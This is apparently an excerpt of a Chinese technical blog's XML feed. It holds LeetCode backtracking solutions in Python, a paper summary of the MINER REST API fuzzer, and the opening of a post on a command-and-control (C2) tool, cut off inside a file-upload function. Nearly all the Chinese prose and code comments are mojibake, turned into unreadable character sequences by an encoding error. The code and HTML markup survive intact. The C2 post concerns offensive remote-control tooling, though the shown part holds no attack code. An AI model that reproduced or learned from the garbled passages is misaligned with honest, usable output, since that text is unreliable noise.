class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> (path <span class="keyword">and</span> nums[i] &lt; path[-<span class="number">1</span>]) <span class="keyword">or</span> nums[i] <span class="keyword">in</span> uset:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            uset.add(nums[i])</span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">            path.pop()</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨å“ˆå¸Œè¡¨ ä¹Ÿå°±æ˜¯æ•°ç»„å»é‡ åªè¦æ ‡è®°æ¯ä¸ªä½ç½®æœ‰æ²¡æœ‰ç”¨è¿‡å°±å¥½äº†</p><h2 id="332-é‡æ–°å®‰æ’è¡Œç¨‹"><a href="#332-é‡æ–°å®‰æ’è¡Œç¨‹" class="headerlink" title="332. é‡æ–°å®‰æ’è¡Œç¨‹"></a>332. é‡æ–°å®‰æ’è¡Œç¨‹</h2><p>ç»™ä½ ä¸€ä»½èˆªçº¿åˆ—è¡¨ tickets ï¼Œå…¶ä¸­ tickets[i] &#x3D; [fromi, toi] è¡¨ç¤ºé£æœºå‡ºå‘å’Œé™è½çš„æœºåœºåœ°ç‚¹ã€‚è¯·ä½ å¯¹è¯¥è¡Œç¨‹è¿›è¡Œé‡æ–°è§„åˆ’æ’åºã€‚<br>æ‰€æœ‰è¿™äº›æœºç¥¨éƒ½å±äºä¸€ä¸ªä» JFKï¼ˆè‚¯å°¼è¿ªå›½é™…æœºåœºï¼‰å‡ºå‘çš„å…ˆç”Ÿï¼Œæ‰€ä»¥è¯¥è¡Œç¨‹å¿…é¡»ä» JFK å¼€å§‹ã€‚å¦‚æœå­˜åœ¨å¤šç§æœ‰æ•ˆçš„è¡Œç¨‹ï¼Œè¯·ä½ æŒ‰å­—å…¸æ’åºè¿”å›æœ€å°çš„è¡Œç¨‹ç»„åˆã€‚<br>ä¾‹å¦‚ï¼Œè¡Œç¨‹ [â€œJFKâ€, â€œLGAâ€] ä¸ [â€œJFKâ€, â€œLGBâ€] ç›¸æ¯”å°±æ›´å°ï¼Œæ’åºæ›´é å‰ã€‚<br>å‡å®šæ‰€æœ‰æœºç¥¨è‡³å°‘å­˜åœ¨ä¸€ç§åˆç†çš„è¡Œç¨‹ã€‚ä¸”æ‰€æœ‰çš„æœºç¥¨ å¿…é¡»éƒ½ç”¨ä¸€æ¬¡ ä¸” åªèƒ½ç”¨ä¸€æ¬¡ã€‚<br><img src="/2024/11/29/algorithm/backtracking/image-6.png"><br>è¾“å…¥ï¼štickets &#x3D; [[â€œMUCâ€,â€LHRâ€],[â€œJFKâ€,â€MUCâ€],[â€œSFOâ€,â€SJCâ€],[â€œLHRâ€,â€SFOâ€]]<br>è¾“å‡ºï¼š[â€œJFKâ€,â€MUCâ€,â€LHRâ€,â€SFOâ€,â€SJCâ€]</p><p>ä¸»è¦æ˜¯æ„å»ºé‚»æ¥è¡¨ï¼Œç„¶åè¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findItinerary</span>(<span class="params">self, tickets: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="variable language_">self</span>.adj = &#123;&#125;</span><br><span class="line">        tickets.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> u, v <span class="keyword">in</span> tickets:</span><br><span class="line">            <span class="keyword">if</span> u <span class="keyword">in</span> <span class="variable language_">self</span>.adj: <span class="variable language_">self</span>.adj[u].append(v)</span><br><span class="line">            <span class="keyword">else</span>: <span class="variable language_">self</span>.adj[u] = [v]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä»JFKå‡ºå‘</span></span><br><span class="line">        <span class="variable language_">self</span>.result = []</span><br><span class="line">        <span class="variable language_">self</span>.dfs(<span class="string">&quot;JFK&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.result[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">while</span> s <span class="keyword">in</span> <span class="variable language_">self</span>.adj <span class="keyword">and</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.adj[s]) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># æ‰¾åˆ°sèƒ½åˆ°å“ªé‡Œ,é€‰ç¬¬ä¸€ä¸ªåˆ°çš„æœºåœº</span></span><br><span class="line">            v = <span class="variable language_">self</span>.adj[s][<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">self</span>.adj[s].pop(<span class="number">0</span>)</span><br><span class="line">            <span class="variable language_">self</span>.dfs(v)</span><br><span class="line">        <span class="variable language_">self</span>.result.append(s)</span><br></pre></td></tr></table></figure><h2 id="Nçš‡å"><a href="#Nçš‡å" class="headerlink" title="Nçš‡å"></a>Nçš‡å</h2><p>æŒ‰ç…§å›½é™…è±¡æ£‹çš„è§„åˆ™ï¼Œçš‡åå¯ä»¥æ”»å‡»ä¸ä¹‹å¤„åœ¨åŒä¸€è¡Œæˆ–åŒä¸€åˆ—æˆ–åŒä¸€æ–œçº¿ä¸Šçš„æ£‹å­ã€‚<br>n çš‡åé—®é¢˜ ç ”ç©¶çš„æ˜¯å¦‚ä½•å°† n ä¸ªçš‡åæ”¾ç½®åœ¨ nÃ—n çš„æ£‹ç›˜ä¸Šï¼Œå¹¶ä¸”ä½¿çš‡åå½¼æ­¤ä¹‹é—´ä¸èƒ½ç›¸äº’æ”»å‡»ã€‚<br>ç»™ä½ ä¸€ä¸ªæ•´æ•° n ï¼Œè¿”å›æ‰€æœ‰ä¸åŒçš„ n çš‡åé—®é¢˜ çš„è§£å†³æ–¹æ¡ˆã€‚<br>æ¯ä¸€ç§è§£æ³•åŒ…å«ä¸€ä¸ªä¸åŒçš„ n çš‡åé—®é¢˜ çš„æ£‹å­æ”¾ç½®æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆä¸­ â€˜Qâ€™ å’Œ â€˜.â€™ åˆ†åˆ«ä»£è¡¨äº†çš‡åå’Œç©ºä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">solveNQueens</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">generateBoard</span>():</span><br><span class="line">            board = <span class="built_in">list</span>()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                row[queens[i]] = <span class="string">&quot;Q&quot;</span></span><br><span class="line">                board.append(<span class="string">&quot;&quot;</span>.join(row))</span><br><span class="line">                row[queens[i]] = <span class="string">&quot;.&quot;</span></span><br><span class="line">            <span class="keyword">return</span> board</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrack</span>(<span class="params">row: <span class="built_in">int</span></span>):</span><br><span class="line">            <span class="keyword">if</span> row == n:</span><br><span class="line">                board = generateBoard()</span><br><span class="line">                solutions.append(board)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> columns <span class="keyword">or</span> row - i <span class="keyword">in</span> diagonal1 <span class="keyword">or</span> row + i <span class="keyword">in</span> diagonal2:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    queens[row] = i</span><br><span class="line">                    columns.add(i)</span><br><span class="line">                    diagonal1.add(row - i)</span><br><span class="line">                    diagonal2.add(row + i)</span><br><span class="line">                    backtrack(row + <span class="number">1</span>)</span><br><span class="line">                    columns.remove(i)</span><br><span class="line">                    diagonal1.remove(row - i)</span><br><span class="line">                    diagonal2.remove(row + i)</span><br><span class="line"></span><br><span class="line">        solutions = <span class="built_in">list</span>()</span><br><span class="line">        queens = [-<span class="number">1</span>]*n</span><br><span class="line">        columns = <span class="built_in">set</span>()</span><br><span class="line">        diagonal1 = <span class="built_in">set</span>()</span><br><span class="line">        diagonal2 = <span class="built_in">set</span>()</span><br><span class="line">        row = [<span class="string">&quot;.&quot;</span>]*n </span><br><span class="line">        backtrack(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> solutions</span><br></pre></td></tr></table></figure><h2 id="37-è§£æ•°ç‹¬"><a href="#37-è§£æ•°ç‹¬" class="headerlink" title="37. è§£æ•°ç‹¬"></a>37. è§£æ•°ç‹¬</h2><p>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œé€šè¿‡å¡«å……ç©ºæ ¼æ¥è§£å†³æ•°ç‹¬é—®é¢˜ã€‚<br>æ•°ç‹¬çš„è§£æ³•éœ€ éµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š<br>æ•°å­— 1-9 åœ¨æ¯ä¸€è¡Œåªèƒ½å‡ºç°ä¸€æ¬¡ã€‚<br>æ•°å­— 1-9 åœ¨æ¯ä¸€åˆ—åªèƒ½å‡ºç°ä¸€æ¬¡ã€‚<br>æ•°å­— 1-9 åœ¨æ¯ä¸€ä¸ªä»¥ç²—å®çº¿åˆ†éš”çš„ 3x3 å®«å†…åªèƒ½å‡ºç°ä¸€æ¬¡ã€‚ï¼ˆè¯·å‚è€ƒç¤ºä¾‹å›¾ï¼‰<br>æ•°ç‹¬éƒ¨åˆ†ç©ºæ ¼å†…å·²å¡«å…¥äº†æ•°å­—ï¼Œç©ºç™½æ ¼ç”¨ â€˜.â€™ è¡¨ç¤ºã€‚<br><img src="/2024/11/29/algorithm/backtracking/image-7.png"></p><p>æ£‹ç›˜æœç´¢é—®é¢˜å¯ä»¥ä½¿ç”¨å›æº¯æ³•æš´åŠ›æœç´¢ï¼Œåªä¸è¿‡è¿™æ¬¡æˆ‘ä»¬è¦åšçš„æ˜¯äºŒç»´é€’å½’ã€‚Nçš‡åé—®é¢˜ (opens new window)æ˜¯å› ä¸ºæ¯ä¸€è¡Œæ¯ä¸€åˆ—åªæ”¾ä¸€ä¸ªçš‡åï¼Œåªéœ€è¦ä¸€å±‚forå¾ªç¯éå†ä¸€è¡Œï¼Œé€’å½’æ¥éå†åˆ—ï¼Œç„¶åä¸€è¡Œä¸€åˆ—ç¡®å®šçš‡åçš„å”¯ä¸€ä½ç½®ã€‚<br>æœ¬é¢˜å°±ä¸ä¸€æ ·äº†ï¼Œæœ¬é¢˜ä¸­æ£‹ç›˜çš„æ¯ä¸€ä¸ªä½ç½®éƒ½è¦æ”¾ä¸€ä¸ªæ•°å­—ï¼ˆè€ŒNçš‡åæ˜¯ä¸€è¡Œåªæ”¾ä¸€ä¸ªçš‡åï¼‰ï¼Œå¹¶æ£€æŸ¥æ•°å­—æ˜¯å¦åˆæ³•ï¼Œè§£æ•°ç‹¬çš„æ ‘å½¢ç»“æ„è¦æ¯”Nçš‡åæ›´å®½æ›´æ·±ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">solveSudoku</span>(<span class="params">self, board: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Do not return anything, modify board in-place instead.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        row_used = [<span class="built_in">set</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">        col_used = [<span class="built_in">set</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">        box_used = [<span class="built_in">set</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                num = board[row][col]</span><br><span class="line">                <span class="keyword">if</span> num == <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                row_used[row].add(num)</span><br><span class="line">                col_used[col].add(num)</span><br><span class="line">                box_used[(row // <span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>].add(num)</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(<span class="number">0</span>, <span class="number">0</span>, board, row_used, col_used, box_used)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, row, col, board, row_used, col_used, box_used</span>):</span><br><span class="line">        <span class="keyword">if</span> row == <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        next_row, next_col = (row, col+<span class="number">1</span>) <span class="keyword">if</span> col &lt; <span class="number">8</span> <span class="keyword">else</span> (row + <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> board[row][col] != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.backtracking(next_row, next_col, board, row_used, col_used, box_used)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>)):</span><br><span class="line">            <span class="keyword">if</span>(num <span class="keyword">not</span> <span class="keyword">in</span> row_used[row] <span class="keyword">and</span> num <span class="keyword">not</span> <span class="keyword">in</span> col_used[col] <span class="keyword">and</span> num <span class="keyword">not</span> <span class="keyword">in</span> box_used[(row//<span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>]):</span><br><span class="line">                board[row][col] = num</span><br><span class="line">                row_used[row].add(num)</span><br><span class="line">                col_used[col].add(num)</span><br><span class="line">                box_used[(row//<span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>].add(num)</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.backtracking(next_row, next_col, board, row_used, col_used, box_used):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                board[row][col] = <span class="string">&quot;.&quot;</span></span><br><span class="line">                row_used[row].remove(num)</span><br><span class="line">                col_used[col].remove(num)</span><br><span class="line">                box_used[(row//<span class="number">3</span>)*<span class="number">3</span>+col//<span class="number">3</span>].remove(num)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å›æº¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è®ºæ–‡ç²¾è¯»ã€‘MINER:A Hybrid Data-Driven Approach for REST API Fuzzing</title>
      <link href="/2024/11/28/PaperReading/MINER/"/>
      <url>/2024/11/28/PaperReading/MINER/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>æ—©æœŸçš„å·¥ä½œåˆ©ç”¨å…ˆå‰æ•è·çš„APIæµé‡å’Œæ‰‹åŠ¨å®šä¹‰çš„è§„åˆ™æ¥ç”Ÿæˆæµ‹è¯•è¯·æ±‚ã€‚æœ€è¿‘ï¼Œä¸ºäº†æ›´å¥½åœ°è‡ªåŠ¨æ¨æ–­è¯·æ±‚ç±»å‹ä¹‹é—´çš„ä¾èµ–å…³ç³»å¹¶æ„é€ è¯·æ±‚åºåˆ—ï¼Œæå‡ºäº†REST APIæ¨¡ç³Šæµ‹è¯•æ¥æµ‹è¯•äº‘æœåŠ¡ã€‚é€šå¸¸</p><ol><li>REST API fuzzerçš„ç”Ÿæˆç­–ç•¥å¤„ç†ä¸¤ä¸ªä¸»è¦é—®é¢˜ï¼Œå³å¦‚ä½•æ„é€ åºåˆ—æ¨¡æ¿ä»¥åŠå¦‚ä½•åœ¨æ¨¡æ¿ä¸­ç”Ÿæˆæ¯ä¸ªè¯·æ±‚ã€‚ç”Ÿæˆåï¼Œfuzzerå‘é€ready-to-useè¯·æ±‚åºåˆ—æ¥æµ‹è¯•ç›®æ ‡äº‘æœåŠ¡;</li><li>å¯¹äºåºåˆ—ä¸­çš„æ¯ä¸ªè¯·æ±‚ï¼Œäº‘æœåŠ¡é¦–å…ˆæ£€æŸ¥è¯·æ±‚æ˜¯å¦ç¬¦åˆè¯­æ³•å’Œè¯­ä¹‰ã€‚å¦‚æœä¸æ˜¯ï¼Œå®ƒè¿”å›ä¸€ä¸ª40xèŒƒå›´çš„å“åº”ã€‚ç›¸åï¼Œäº‘æœåŠ¡æ ¹æ®è¯·æ±‚æ‰§è¡Œè¡Œä¸ºï¼Œä¾‹å¦‚ï¼Œäº‘æœåŠ¡åœ¨æ”¶åˆ°DELETEè¯·æ±‚æ—¶åˆ é™¤èµ„æºã€‚å¦‚æœäº‘æœåŠ¡è¡Œä¸ºæ­£å¸¸ï¼Œä¾‹å¦‚ï¼Œå®ƒæ ¹æ®è¯·æ±‚æˆåŠŸåœ°åˆ é™¤äº†æŒ‡å®šçš„èµ„æºï¼Œå®ƒå°†è¿”å›ä¸€ä¸ª20x Rangeçš„å“åº”ã€‚å¦åˆ™ï¼Œäº‘æœåŠ¡è¡Œä¸ºå¼‚å¸¸ï¼Œä¾‹å¦‚ï¼Œå®ƒè¯•å›¾åˆ é™¤ä¸å­˜åœ¨çš„èµ„æºå¹¶å¯¼è‡´é”™è¯¯çŠ¶æ€ã€‚ç„¶åï¼Œå®ƒè¿”å›ä¸€ä¸ª50xèŒƒå›´çš„å“åº”;</li><li>fuzzeråˆ†æå¯¹æ¯ä¸ªè¯·æ±‚çš„å“åº”ï¼Œæ¨æ–­äº‘æœåŠ¡çš„è§¦å‘çŠ¶æ€;</li><li>fuzzeræ”¶é›†è§¦å‘é”™è¯¯çŠ¶æ€çš„å”¯ä¸€è¯·æ±‚åºåˆ—ï¼Œä¾‹å¦‚å“åº”åœ¨50xèŒƒå›´å†…æˆ–è¿åå®‰å…¨è§„åˆ™çš„åºåˆ—ã€‚æŒ‰ç…§ä¸Šè¿°æ­¥éª¤ï¼ŒREST APIæ¨¡ç³Šå™¨å°†ä½¿ç”¨ç”Ÿæˆçš„è¯·æ±‚åºåˆ—æ¢ç´¢å¯è®¿é—®çš„äº‘æœåŠ¡çŠ¶æ€ã€‚</li></ol><p>ç°æœ‰å·¥ä½œçš„ä¸è¶³ï¼š</p><ol><li>ç°æœ‰çš„fuzzersé€šå¸¸æ— æ³•æ‰©å±•è¯·æ±‚åºåˆ—æ¨¡æ¿ã€‚å®ƒä»¬çš„åºåˆ—æ‰©å±•è¿‡ç¨‹ç»å¸¸æ”¾å¼ƒå·²æ„å»ºçš„åºåˆ—æ¨¡æ¿ï¼Œä»ç©ºæ¨¡æ¿å¼€å§‹ï¼Œè¿™ç»™æ„å»ºæ›´å¤§é•¿åº¦çš„åºåˆ—å¸¦æ¥äº†æŒ‘æˆ˜;</li><li>å½“åœ¨åºåˆ—æ¨¡æ¿ä¸­ç”Ÿæˆè¯·æ±‚æ—¶ï¼Œç°æœ‰çš„fuzzerséšæœºé€‰æ‹©è¯·æ±‚å‚æ•°çš„å€¼ã€‚å®ƒä»¬æ— æ³•ç¡®å®šåº”è¯¥æ›´æ”¹å“ªä¸ªå‚æ•°æˆ–åº”è¯¥åˆ†é…ä»€ä¹ˆå‚æ•°å€¼ï¼Œå³è¯·æ±‚ä¸Šçš„é”®æ›´æ”¹ã€‚</li></ol><p>æœ¬æ–‡å·¥ä½œçš„å†…å®¹ï¼š</p><ol><li>é¢å‘é•¿åº¦çš„åºåˆ—æ„å»º:MINERåˆ©ç”¨å†å²æ•°æ®æŒ‡å¯¼åºåˆ—ç”Ÿæˆã€‚å…·ä½“æ¥è¯´ï¼ŒMINERæ”¶é›†åœ¨è¿‡å»çš„æ¨¡ç³Šå¤„ç†è¿‡ç¨‹ä¸­å·²æˆåŠŸç”Ÿæˆè¯·æ±‚å¹¶é€šè¿‡äº‘æœåŠ¡æ£€æŸ¥çš„åºåˆ—æ¨¡æ¿ï¼Œä½œä¸ºåºåˆ—æ‰©å±•è¿‡ç¨‹çš„åˆå§‹æ¨¡æ¿ã€‚ç„¶åï¼ŒMINERåˆ©ç”¨æ¦‚ç‡å‡½æ•°åœ¨æ‰©å±•è¿‡ç¨‹ä¸­ä¸ºé•¿åº¦è¾ƒå¤§çš„åºåˆ—æ¨¡æ¿åˆ†é…æ›´å¤šçš„é€‰æ‹©æ¬¡æ•°;</li><li>åŸºäºæ³¨æ„æ¨¡å‹çš„è¯·æ±‚ç”Ÿæˆ:ä¸ºäº†æé«˜è¯·æ±‚ç”Ÿæˆè´¨é‡ï¼Œå¯¹äºæ¯ä¸€ä¸ªé€šè¿‡æ£€æŸ¥çš„æœ‰æ•ˆè¯·æ±‚ï¼ŒMINERé¦–å…ˆæ”¶é›†å…¶å‚æ•°å’Œä½¿ç”¨å€¼ä½œä¸ºå…³é”®çªå˜ã€‚å…¶æ¬¡ï¼ŒMINERæ„å»ºäº†ä¸€ä¸ªæ³¨æ„åŠ›æ¨¡å‹ï¼Œè¯¥æ¨¡å‹æ˜¯æœ€å…ˆè¿›çš„ç¥ç»ç½‘ç»œæ¨¡å‹ä¹‹ä¸€ï¼Œç”¨äºå­¦ä¹ å…³é”®çªå˜ä¹‹é—´çš„éšå«å…³ç³»ã€‚ç„¶åï¼ŒMINERåˆ©ç”¨è¯¥æ¨¡å‹ç”Ÿæˆæ›´å¤šæ ·åŒ–çš„æ‰€éœ€é”®çªå˜ç»„åˆï¼Œä»è€Œæ„å»ºé«˜è´¨é‡çš„è¯·æ±‚ä»¥é€šè¿‡æ£€æŸ¥ï¼Œå¹¶æ¢ç´¢äº‘æœåŠ¡çš„ä¸åŒçŠ¶æ€;</li><li>è¯·æ±‚å‚æ•°è¿ä¾‹æ£€æŸ¥:MINERå®ç°äº†ä¸€ä¸ªé¢å¤–çš„å®‰å…¨è§„åˆ™æ£€æŸ¥å™¨æ¥æ•è·ä¸æ­£ç¡®çš„å‚æ•°ä½¿ç”¨é”™è¯¯ã€‚é€šè¿‡ä½¿ç”¨è¿™ä¸ªæ£€æŸ¥å™¨ï¼ŒMINERç”Ÿæˆä¸€ä¸ªå¸¦æœ‰æœªå®šä¹‰å‚æ•°çš„æ–°è¯·æ±‚æ¥æµ‹è¯•äº‘æœåŠ¡ã€‚ä¾‹å¦‚ï¼ŒMINERå¯ä»¥æ„é€ ä¸€ä¸ªåŒ…å«æœªå®šä¹‰å‚æ•°çš„PUTè¯·æ±‚ï¼Œè¯¥å‚æ•°æ¥è‡ªPOSTè¯·æ±‚ã€‚å¦‚æœè¯·æ±‚å¾—åˆ°çš„å“åº”åœ¨50xèŒƒå›´å†…ï¼ŒMINERæ¨æ–­è§¦å‘äº†ä¸æ­£ç¡®çš„å‚æ•°ä½¿ç”¨é”™è¯¯ï¼Œå¹¶åœ¨æœ¬åœ°è®°å½•ä½¿ç”¨çš„è¯·æ±‚ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥åˆ†æã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®ºæ–‡ç²¾è¯» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥å…·å¼€å‘ã€‘åŠ¨æ€C2æ”¹è¿›</title>
      <link href="/2024/11/25/tools/c2improve/"/>
      <url>/2024/11/25/tools/c2improve/</url>
      
        <content type="html"><![CDATA[<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/g0dam/c2Improve">https://github.com/g0dam/c2Improve</a></p><h2 id="åŠ¨æ€ç«¯å£"><a href="#åŠ¨æ€ç«¯å£" class="headerlink" title="åŠ¨æ€ç«¯å£"></a>åŠ¨æ€ç«¯å£</h2><p>åŠ¨æ€ç«¯å£ç”±æ§åˆ¶ç«¯ä¸»åŠ¨ç”³è¯· å› ä¸ºä»»åŠ¡ä¸‹å‘ä¸»è¦æ˜¯æ§åˆ¶ç«¯åœ¨åš</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">uploadfile</span>(<span class="params">self, host_key: <span class="built_in">str</span>, filepath: <span class="built_in">str</span>, targetfilepath: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.sync_keys()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists(filepath.strip()):  <span class="comment"># åˆ¤æ–­è¦ä¸Šä¼ 